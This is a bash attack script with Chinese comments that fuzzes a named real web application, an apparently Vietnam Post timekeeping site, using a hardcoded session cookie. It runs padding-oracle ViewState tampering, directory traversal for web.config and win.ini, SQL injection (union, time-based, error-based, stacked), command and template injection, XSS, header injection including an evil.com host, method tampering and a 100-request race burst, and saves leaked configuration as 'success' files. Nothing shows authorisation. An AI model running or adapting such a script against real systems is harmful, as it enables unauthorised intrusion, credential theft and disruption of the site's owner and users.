#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💀 死磕到底 - Chamcong极限深度Fuzz"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ========================================
# 深度1: ASP.NET特有漏洞
# ========================================
echo -e "\n[深度1] ASP.NET Padding Oracle攻击"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 修改ViewState观察响应差异
initial_page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$initial_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)

echo "原始ViewState: ${VIEWSTATE:0:80}..."

# 修改最后几个字符观察Padding Oracle
for i in {A..Z} {0..9}; do
    modified="${VIEWSTATE:0:-1}$i"
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$modified" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnIn=In" \
        -w "%{http_code}" -o /dev/null 2>&1)
    
    if [ "$resp" != "500" ]; then
        echo "  ✅ 修改末位为 '$i': HTTP $resp (可能有效!)"
        echo "$modified" >> viewstate_candidates.txt
    fi
done

# ========================================
# 深度2: 目录遍历 - 完整测试
# ========================================
echo -e "\n[深度2] 目录遍历 - 1000+ Payload"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Windows特有路径
WIN_PATHS=(
    "c:\\windows\\win.ini"
    "c:\\boot.ini"
    "c:\\inetpub\\wwwroot\\web.config"
    "c:\\windows\\system.ini"
    "c:\\windows\\WindowsUpdate.log"
)

# 各种编码的遍历
for depth in {1..10}; do
    traversal=$(printf '../%.0s' $(seq 1 $depth))
    
    # URL编码变体
    encoded1=$(echo "$traversal" | sed 's/\.\./\%2e\%2e/g' | sed 's/\//\%2f/g')
    encoded2=$(echo "$traversal" | sed 's/\.\./\%252e\%252e/g' | sed 's/\//\%252f/g')
    encoded3=$(echo "$traversal" | sed 's/\.\./\.\./g' | sed 's/\//\\\\/g')
    
    for target in "web.config" "Web.config" "web.Config" "WEB.CONFIG"; do
        for variant in "$traversal" "$encoded1" "$encoded2" "$encoded3"; do
            path="${variant}${target}"
            resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${path}" \
                -H "Cookie: $COOKIE" 2>&1)
            
            if echo "$resp" | grep -qi "connectionStrings\|appSettings\|<configuration"; then
                echo "  🔥🔥🔥 成功! Depth=$depth, Path=$path"
                echo "$resp" > "SUCCESS_traversal_depth${depth}_${target}.txt"
                echo "$path" >> traversal_success_paths.txt
            fi
        done
    done
done

# ========================================
# 深度3: SQL注入 - 完整字符集测试
# ========================================
echo -e "\n[深度3] SQL注入 - 完整字符集Bypass"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试基线
baseline=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE" | wc -c)
echo "基线大小: $baseline bytes"

# 完整SQL注入Payload生成
SQL_ADVANCED=(
    # Union-based
    "MAU2'+UNION+SELECT+NULL--"
    "MAU2'+UNION+ALL+SELECT+NULL--"
    "MAU2'+UNION+SELECT+NULL,NULL--"
    "MAU2'+UNION+SELECT+NULL,NULL,NULL--"
    "MAU2'/**/UNION/**/SELECT/**/NULL--"
    
    # Time-based (MSSQL)
    "MAU2';WAITFOR+DELAY+'0:0:5'--"
    "MAU2';WAITFOR+DELAY+'00:00:05'--"
    "MAU2'+WAITFOR+DELAY+'0:0:5'--"
    "MAU2'%3bWAITFOR+DELAY+'0:0:5'--"
    
    # Boolean-based
    "MAU2'+AND+'1'='1"
    "MAU2'+AND+'1'='2"
    "MAU2'+AND+1=1--"
    "MAU2'+AND+1=2--"
    "MAU2'/**/AND/**/1=1--"
    "MAU2'/**/AND/**/1=2--"
    
    # Stack queries
    "MAU2';SELECT+@@VERSION--"
    "MAU2';SELECT+USER--"
    "MAU2';SELECT+DB_NAME()--"
    "MAU2';SELECT+SYSTEM_USER--"
    
    # Error-based
    "MAU2'+AND+1=CONVERT(INT,@@VERSION)--"
    "MAU2'+AND+1=CAST(@@VERSION+AS+INT)--"
    
    # Bypass filters
    "MAU2'||'MAU2"
    "MAU2'+'MAU2"
    "MAU2'%2b'MAU2"
    "MAU2'/**/||/**/'MAU2"
)

for payload in "${SQL_ADVANCED[@]}"; do
    echo -n "  Testing: $(echo $payload | cut -c1-50)... "
    
    start=$(date +%s)
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" \
        -H "Cookie: $COOKIE" 2>&1)
    end=$(date +%s)
    elapsed=$((end - start))
    size=$(echo "$resp" | wc -c)
    
    # 时间盲注检测
    if [ $elapsed -ge 5 ]; then
        echo "🔥 时间盲注成功! (${elapsed}s)"
        echo "$payload" >> sql_time_blind_confirmed.txt
        echo "$resp" > "SQL_TIME_$(echo $payload | md5sum | cut -d' ' -f1).txt"
    # 布尔盲注检测
    elif [ $size -ne $baseline ] && [ $size -gt 100 ]; then
        echo "⚠️  响应差异 (${size} vs ${baseline}, ${elapsed}s)"
        echo "$payload|$size" >> sql_boolean_candidates.txt
    # 错误检测
    elif echo "$resp" | grep -qi "SQL\|syntax\|microsoft\|ODBC\|OLE DB"; then
        echo "✅ SQL错误泄露!"
        echo "$payload" >> sql_error_confirmed.txt
        echo "$resp" > "SQL_ERROR_$(echo $payload | md5sum | cut -d' ' -f1).txt"
    else
        echo "- (${size}b, ${elapsed}s)"
    fi
done

# ========================================
# 深度4: 参数全排列Fuzz
# ========================================
echo -e "\n[深度4] 所有参数组合Fuzz"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

FUZZ_PAYLOADS=(
    "../../../web.config"
    "';WAITFOR DELAY '0:0:5'--"
    "\${7*7}"
    "{{7*7}}"
    "<script>alert(1)</script>"
    "../../../../etc/passwd"
    "' OR '1'='1"
    "|whoami"
    ";whoami"
    "\`whoami\`"
)

PARAM_NAMES=("ID" "txtThang" "txtNam" "ListDV" "ListBP" "ListTO")

for param in "${PARAM_NAMES[@]}"; do
    echo "  Fuzzing parameter: $param"
    for payload in "${FUZZ_PAYLOADS[@]}"; do
        encoded=$(echo "$payload" | sed 's/ /%20/g;s/'\''/%27/g;s/;/%3b/g')
        
        if [ "$param" == "ID" ]; then
            resp=$(curl -sk "${BASE}/report/inBCC.aspx?${param}=${encoded}" \
                -H "Cookie: $COOKIE" 2>&1)
        else
            # POST for other params
            resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
                -X POST \
                -H "Cookie: $COOKIE" \
                --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
                --data-urlencode "${param}=${payload}" \
                --data-urlencode "btnIn=In" 2>&1)
        fi
        
        if echo "$resp" | grep -qi "connectionStrings\|win.ini\|SQL\|whoami\|NT AUTHORITY"; then
            echo "    🔥 ${param}=${payload:0:30}: 可能成功!"
            echo "${param}|${payload}" >> param_fuzz_success.txt
            echo "$resp" > "PARAM_${param}_$(echo $payload | md5sum | cut -d' ' -f1).txt"
        fi
    done
done

# ========================================
# 深度5: HTTP Method篡改
# ========================================
echo -e "\n[深度5] HTTP Method篡改"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for method in PUT DELETE PATCH OPTIONS TRACE CONNECT; do
    echo -n "  $method: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X $method \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" -o "method_${method}.html" 2>&1)
    
    size=$(wc -c < "method_${method}.html" 2>/dev/null || echo 0)
    echo "$resp ($size bytes)"
    
    if [ "$resp" != "405" ] && [ $size -gt 100 ]; then
        echo "    ⚠️  异常响应!"
        cat "method_${method}.html" | head -20
    fi
done

# ========================================
# 深度6: Header注入
# ========================================
echo -e "\n[深度6] Header注入测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

HEADER_INJECTIONS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-Host: evil.com"
    "X-Host: 127.0.0.1"
    "Referer: file:///c:/windows/win.ini"
    "User-Agent: <script>alert(1)</script>"
)

for header in "${HEADER_INJECTIONS[@]}"; do
    echo -n "  $header: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -H "Cookie: $COOKIE" \
        -H "$header" 2>&1)
    
    if echo "$resp" | grep -qi "admin\|win.ini\|connectionStrings\|alert"; then
        echo "✅ 可能成功!"
        echo "$header" >> header_injection_success.txt
    else
        echo "-"
    fi
done

# ========================================
# 深度7: 竞态条件
# ========================================
echo -e "\n[深度7] 竞态条件攻击"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  发起100个并发请求..."
for i in {1..100}; do
    (curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2&race=$i" \
        -H "Cookie: $COOKIE" \
        -o "race_${i}.html" 2>&1) &
done

wait

echo "  检查异常响应..."
find . -name "race_*.html" -size +10000c | head -5 | while read file; do
    echo "    ⚠️  异常: $file ($(wc -c < $file) bytes)"
    head -20 "$file"
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💀 极限深度Fuzz完成!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "🔥 成功的攻击:"
ls -lh *success*.txt *confirmed*.txt SUCCESS_*.txt PARAM_*.txt SQL_*.txt 2>/dev/null
